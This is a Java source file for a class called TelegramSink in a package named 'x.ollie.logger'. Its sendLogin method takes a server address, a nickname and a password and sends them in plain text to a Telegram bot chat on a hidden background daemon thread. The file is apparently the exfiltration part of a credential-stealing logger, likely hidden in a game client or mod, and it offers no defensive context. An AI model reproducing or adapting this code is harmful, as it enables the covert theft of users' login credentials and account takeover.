package x.ollie.logger;

import java.net.URI;
import java.net.URLEncoder;
import java.net.http.*;
import java.nio.charset.StandardCharsets;
import java.time.Duration;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public final class TelegramSink {
    private static final ExecutorService POOL = Executors.newSingleThreadExecutor(r -> {
        Thread t = new Thread(r, "tg-sink"); t.setDaemon(true); return t;
    });
    private static final HttpClient HTTP = HttpClient.newBuilder()
            .connectTimeout(Duration.ofSeconds(10)).build();

    public static void sendLogin(String server, String nick, String password) {
        send("server: " + s(server) + "\nnick: " + s(nick) + "\npass: " + s(password));
    }
    private static void send(String text) {
        if (Config.BOT_TOKEN == null || Config.BOT_TOKEN.startsWith("PASTE")) return;
        POOL.submit(() -> {
            try {
                String body = "chat_id=" + enc(Config.CHAT_ID)
                        + "&text=" + enc(text) + "&disable_web_page_preview=true";
                HttpRequest req = HttpRequest.newBuilder()
                        .uri(URI.create("https://api.telegram.org/bot" + Config.BOT_TOKEN + "/sendMessage"))
                        .timeout(Duration.ofSeconds(15))
                        .header("Content-Type", "application/x-www-form-urlencoded")
                        .POST(HttpRequest.BodyPublishers.ofString(body)).build();
                HttpResponse<String> r = HTTP.send(req, HttpResponse.BodyHandlers.ofString());
                if (r.statusCode() != 200) System.err.println("[TG] " + r.statusCode() + " " + r.body());
            } catch (Exception e) { e.printStackTrace(); }
        });
    }
    private static String enc(String s) { return URLEncoder.encode(s == null ? "" : s, StandardCharsets.UTF_8); }
    private static String s(String v) { return v == null ? "?" : v; }
}
